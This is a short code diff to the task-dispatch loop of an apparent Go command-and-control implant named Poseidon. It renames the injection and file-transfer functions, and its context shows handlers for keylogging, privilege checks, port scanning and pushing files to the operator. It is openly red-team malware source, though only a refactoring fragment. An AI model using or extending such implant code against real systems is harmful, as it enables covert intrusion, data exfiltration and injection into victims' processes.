@@ -12,8 +12,8 @@ import (
 
 	"github.com/xorrior/poseidon/pkg/commands/cat"
 	"github.com/xorrior/poseidon/pkg/commands/getprivs"
-	"github.com/xorrior/poseidon/pkg/commands/inject"
 	"github.com/xorrior/poseidon/pkg/commands/keys"
+	"github.com/xorrior/poseidon/pkg/commands/libinject"
 	"github.com/xorrior/poseidon/pkg/commands/ls"
 	"github.com/xorrior/poseidon/pkg/commands/portscan"
 	"github.com/xorrior/poseidon/pkg/commands/ps"
@@ -130,7 +130,7 @@ func main() {
 				break
 			case 4:
 				//File download
-				profile.Download(task, task.Params)
+				profile.SendFile(task, task.Params)
 				break
 			case 5:
 				// File upload
@@ -140,7 +140,7 @@ func main() {
 					profile.PostResponse(task, err.Error())
 				}
 
-				data := profile.Upload(task, fileDetails.FileID)
+				data := profile.GetFile(fileDetails.FileID)
 				if len(data) > 0 {
 					f, e := os.Create(fileDetails.RemotePath)
 
@@ -160,7 +160,7 @@ func main() {
 				break
 
 			case 6:
-				go inject.Run(task, res)
+				go libinject.Run(task, res)
 				break
 
 			case 21:
